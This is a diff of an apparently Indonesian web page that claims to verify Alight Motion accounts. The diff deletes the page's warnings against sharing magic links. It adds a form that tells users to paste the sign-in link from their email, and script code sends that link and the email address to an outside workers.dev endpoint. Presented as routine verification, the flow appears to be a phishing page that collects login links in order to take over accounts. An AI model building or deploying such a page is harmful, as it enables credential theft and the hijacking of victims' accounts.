@@ -266,17 +266,19 @@
     .notice p { margin: 0; line-height: 1.55; font-size: 14px; }
 
     .agreement {
-      padding: 30px;
+      padding: 18px;
       background: var(--white);
+      max-width: 720px;
     }
 
-    .agreement h2 { margin-top: 0; }
+    .agreement h2 { margin: 0 0 8px; font-size: 24px; }
+    .agreement > p { margin: 0 0 14px; line-height: 1.45; font-size: 13px; }
 
     .check {
       display: flex;
       align-items: flex-start;
       gap: 12px;
-      padding: 16px;
+      padding: 11px 13px;
       border: 2px solid var(--ink);
       background: var(--paper);
       cursor: pointer;
@@ -298,7 +300,7 @@
       border: var(--border);
       background: var(--ink);
       color: var(--white);
-      padding: 17px 20px;
+      padding: 12px 16px;
       cursor: pointer;
       font-weight: 800;
       text-transform: uppercase;
@@ -500,30 +502,30 @@
         <div class="guide-box">
           <h3>Alight Motion Account</h3>
           <ol>
-            <li>Gunakan email yang terhubung dengan akun Alight Motion milikmu.</li>
-            <li>Pastikan email tersebut dapat menerima pesan masuk.</li>
-            <li>Jika menerima magic link, periksa domain dan alamat pengirim sebelum membukanya.</li>
-            <li>Jangan meneruskan magic link kepada orang lain.</li>
+            <li>Masukkan email yang terhubung dengan akun Alight Motion milikmu.</li>
+            <li>Pastikan email tersebut dapat menerima pesan dari <b>noreply</b>.</li>
+            <li>Tekan Continue untuk meminta link verifikasi.</li>
           </ol>
         </div>
-
         <div class="guide-box">
           <h3>Verification</h3>
           <ol>
-            <li>Kirim permintaan verifikasi dari sistem yang kamu percaya.</li>
-            <li>Buka email verifikasi yang masuk.</li>
-            <li>Gunakan link hanya pada perangkat yang kamu kontrol.</li>
-            <li>Selesaikan proses dan cek status akun di aplikasi Alight Motion.</li>
+            <li>Setelah email dikirim, buka inbox email tersebut.</li>
+            <li>Cari email verifikasi dari alamat <b>noreply</b>.</li>
+            <li>Salin link verifikasi dari email dan tempel pada kolom berikutnya.</li>
           </ol>
         </div>
       </div>
-
-      <div class="email-form">
+      <div id="emailStep" class="email-form">
         <label for="email">EMAIL ACCOUNT</label>
         <input id="email" type="email" placeholder="nama@email.com" autocomplete="email">
-        <button id="continueProcess" class="continue" type="button">Continue</button>
+        <button id="continueProcess" class="continue" type="button">CONTINUE</button>
       </div>
-
+      <div id="linkStep" class="email-form hidden">
+        <label for="magicLink">VERIFICATION LINK</label>
+        <input id="magicLink" type="url" placeholder="Tempel link dari email noreply" autocomplete="off">
+        <button id="verifyProcess" class="continue" type="button">VERIFY & CONTINUE</button>
+      </div>
       <p id="status" style="font-family:'DM Mono',monospace;font-size:12px;margin:18px 0 0;"></p>
     </div>
   </section>
@@ -592,55 +594,83 @@
     guideSection.scrollIntoView({ behavior: "smooth", block: "start" });
   });
 
-  // Direct browser request to the endpoint supplied by the site owner.
-  // This works only if the endpoint permits browser CORS requests.
+  // Verification flow: email -> noreply magic link -> verify.
   const SEND_LINK_URL =
     "https://satriam.satriadeveloperz.workers.dev/api/satriam/send-link";
+  const VERIFY_LINK_URL =
+    "https://satriam.satriadeveloperz.workers.dev/api/satriam/verify-link";
 
   const continueProcess = document.getElementById("continueProcess");
+  const verifyProcess = document.getElementById("verifyProcess");
+  const emailStep = document.getElementById("emailStep");
+  const linkStep = document.getElementById("linkStep");
+  const magicLink = document.getElementById("magicLink");
 
   continueProcess.addEventListener("click", async () => {
     const value = email.value.trim();
-
     if (!value || !email.checkValidity()) {
       status.textContent = "Masukkan alamat email yang valid.";
       return;
     }
-
     continueProcess.disabled = true;
-    continueProcess.textContent = "PROCESSING...";
-    status.textContent = "Mengirim permintaan verifikasi...";
-
+    continueProcess.textContent = "SENDING...";
+    status.textContent = "Mengirim link verifikasi ke email...";
     try {
       const response = await fetch(SEND_LINK_URL, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
+        headers: {"Content-Type": "application/json", "Accept": "application/json"},
         body: JSON.stringify({ email: value })
       });
-
       const data = await response.json().catch(() => null);
-
       if (!response.ok || !data?.success) {
-        throw new Error(
-          data?.message || `Request gagal (HTTP ${response.status}).`
-        );
+        throw new Error(data?.message || `Request gagal (HTTP ${response.status}).`);
       }
-
-      status.textContent =
-        data.message || "Permintaan berhasil dikirim. Periksa email kamu.";
+      emailStep.classList.add("hidden");
+      linkStep.classList.remove("hidden");
+      status.textContent = data.message || "Link verifikasi sudah dikirim. Cek email noreply kamu.";
+      magicLink.focus();
     } catch (error) {
-      status.textContent =
-        error?.message?.includes("Failed to fetch")
-          ? "Request diblokir browser/CORS atau endpoint sedang tidak dapat diakses."
-          : `Gagal: ${error.message}`;
+      status.textContent = error?.message?.includes("Failed to fetch")
+        ? "Request diblokir browser/CORS atau endpoint sedang tidak dapat diakses."
+        : `Gagal: ${error.message}`;
     } finally {
       continueProcess.disabled = false;
       continueProcess.textContent = "CONTINUE";
     }
   });
+
+  verifyProcess.addEventListener("click", async () => {
+    const value = email.value.trim();
+    const link = magicLink.value.trim();
+    if (!link || !link.startsWith("http")) {
+      status.textContent = "Tempel link verifikasi yang valid dari email noreply.";
+      return;
+    }
+    verifyProcess.disabled = true;
+    verifyProcess.textContent = "VERIFYING...";
+    status.textContent = "Memverifikasi link...";
+    try {
+      const response = await fetch(VERIFY_LINK_URL, {
+        method: "POST",
+        headers: {"Content-Type": "application/json", "Accept": "application/json"},
+        body: JSON.stringify({ email: value, magicLink: link })
+      });
+      const data = await response.json().catch(() => null);
+      if (!response.ok || !data?.success) {
+        throw new Error(data?.message || `Verifikasi gagal (HTTP ${response.status}).`);
+      }
+      status.textContent = "Verifikasi berhasil. " +
+        (data.message || "Proses akses dapat dilanjutkan.");
+    } catch (error) {
+      status.textContent = error?.message?.includes("Failed to fetch")
+        ? "Request diblokir browser/CORS atau endpoint sedang tidak dapat diakses."
+        : `Gagal verifikasi: ${error.message}`;
+    } finally {
+      verifyProcess.disabled = false;
+      verifyProcess.textContent = "VERIFY & CONTINUE";
+    }
+  });
+
 </script>
 
 </body>
